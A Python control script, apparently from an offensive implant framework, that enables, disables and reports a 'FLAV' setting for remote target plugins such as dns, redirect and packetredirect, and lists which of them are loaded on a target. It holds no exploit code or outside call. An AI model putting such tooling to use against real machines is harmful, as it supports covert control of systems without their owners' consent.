
import ops.cmd, ops
import dsz
import os.path
import sys

def checkplugin(plugins_obj, command_to_check):
    commands_found = []
    for plugin in plugins_obj.remote.plugin:
        if plugin.name.lower().startswith(('%s_target' % command_to_check.lower())):
            commands_found.append(plugin.name)
    return commands_found

def checkflav(module_obj, command_to_check):
    for system in module_obj.moduletoggle.system:
        if system.name.upper().startswith(command_to_check.upper()):
            if (system.selected == 'FLAV'):
                return True
            else:
                return False
    return False

def flav_toggle(plugin, operation):
    if (operation == 'enable'):
        cmd = ops.cmd.getDszCommand(('moduletoggle -system %s_TARGET -set FLAV' % plugin.upper()), dszquiet=False)
    else:
        cmd = ops.cmd.getDszCommand(('moduletoggle -system %s_TARGET -set DEFAULT' % plugin.upper()), dszquiet=False)
    cmd.execute()

def check_status(plugin_list):
    dsz.ui.Echo(('=' * 80), dsz.GOOD)
    dsz.ui.Echo(((('=' * 36) + ' Status ') + ('=' * 36)), dsz.GOOD)
    dsz.ui.Echo(('=' * 80), dsz.GOOD)
    cmd = ops.cmd.getDszCommand('plugins')
    plugins_obj = cmd.execute()
    modcmd = ops.cmd.getDszCommand('moduletoggle -list')
    modobj = modcmd.execute()
    for plugin in plugin_list:
        dsz.ui.Echo(('Status of %s FLAV change:' % plugin))
        loaded_plugins = checkplugin(plugins_obj, plugin)
        if checkflav(modobj, plugin):
            dsz.ui.Echo('\tENABLED', dsz.GOOD)
        else:
            dsz.ui.Echo('\tDISABLED', dsz.ERROR)
        if (len(loaded_plugins) == 0):
            dsz.ui.Echo(('\tNo %s plugins currently loaded remotely' % plugin))
        else:
            for loaded in loaded_plugins:
                dsz.ui.Echo(('\t%s currently loaded remotely' % loaded), dsz.WARNING)
        dsz.ui.Echo('')

def main():
    params = dsz.lp.cmdline.ParseCommandLine(sys.argv, 'flavplugincontrol.txt')
    plugin = None
    operation = None
    plugin_list = ['banner', 'dns', 'packetredirect', 'ping', 'redirect', 'traceroute']
    if params.has_key('enable'):
        if (not (len(params['enable']) == 1)):
            dsz.ui.Echo('You must specify only the plugin you wish to enable.', dsz.ERROR)
            return False
        plugin = params['enable'][0]
        operation = 'enable'
    elif params.has_key('disable'):
        if (not (len(params['disable']) == 1)):
            dsz.ui.Echo('You must specify only the plugin you wish to disable.', dsz.ERROR)
            return False
        plugin = params['disable'][0]
        operation = 'disable'
    elif params.has_key('status'):
        check_status(plugin_list)
        return True
    else:
        dsz.ui.Echo('You must specify either -enable or -disable.', dsz.ERROR)
        return False
    if ((not (plugin.lower() in plugin_list)) and (not (plugin.lower() == 'all'))):
        dsz.ui.Echo("You must specify one of the following FLAV aware plugins, or 'all':", dsz.ERROR)
        for plugin in plugin_list:
            dsz.ui.Echo(('\t%s' % plugin), dsz.ERROR)
        return False
    if (plugin == 'all'):
        for plugin in plugin_list:
            flav_toggle(plugin, operation)
    else:
        flav_toggle(plugin, operation)
    check_status(plugin_list)
if (__name__ == '__main__'):
    try:
        main()
    except RuntimeError as e:
        dsz.ui.Echo(('\nCaught RuntimeError: %s' % e), dsz.ERROR)